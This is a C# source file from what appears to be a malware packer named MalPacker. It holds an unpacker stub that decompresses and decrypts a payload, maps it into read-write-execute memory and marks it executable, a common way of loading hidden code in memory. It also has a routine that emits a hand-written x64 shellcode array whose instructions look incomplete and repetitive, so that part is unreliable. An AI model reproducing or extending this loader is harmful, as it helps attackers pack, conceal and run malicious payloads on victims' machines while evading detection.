namespace MalPacker.Stub;

using System.Runtime.InteropServices;
using MalPacker.Packing;

public static class UnpackerStub
{
    [DllImport("kernel32.dll")]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocType, uint flProtect);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static IntPtr UnpackAndMap(byte[] packedData, byte[]? encryptionKey)
    {
        byte[] decompressed = LzmaCompressor.Decompress(packedData);

        if (encryptionKey is not null)
        {
            var encryptor = new SectionEncryptor();
            decompressed = encryptor.DecryptSection(decompressed, encryptionKey);
        }

        IntPtr baseAddress = VirtualAlloc(IntPtr.Zero, (uint)decompressed.Length, 0x3000, 0x40);
        if (baseAddress == IntPtr.Zero)
            return IntPtr.Zero;

        Marshal.Copy(decompressed, 0, baseAddress, decompressed.Length);

        VirtualProtect(baseAddress, (uint)decompressed.Length, 0x20, out _);

        return baseAddress;
    }

    public static byte[] GenerateUnpackerShellcode(int packedSize, int originalSize)
    {
        byte[] shellcode =
        [
            0x55,                               // push rbp
            0x48, 0x89, 0xE5,                   // mov rbp, rsp
            0x48, 0x83, 0xEC, 0x20,             // sub rsp, 0x20
            0x48, 0x89, 0xCE,                   // mov rsi, rcx (packed data ptr)
            0xB9, 0x00, 0x00, 0x00, 0x00,       // mov ecx, original_size
            0x48, 0x31, 0xD2,                   // xor rdx, rdx
            0x41, 0xB8, 0x00, 0x30, 0x00, 0x00, // mov r8d, MEM_COMMIT|MEM_RESERVE
            0x41, 0xB9, 0x40, 0x00, 0x00, 0x00, // mov r9d, PAGE_EXECUTE_READWRITE
            0x48, 0x89, 0xE5,                   // mov rbp, rsp
            0x5D,                               // pop rbp
            0xC3                                 // ret
        ];

        BitConverter.GetBytes(originalSize).CopyTo(shellcode, 12);
        return shellcode;
    }
}
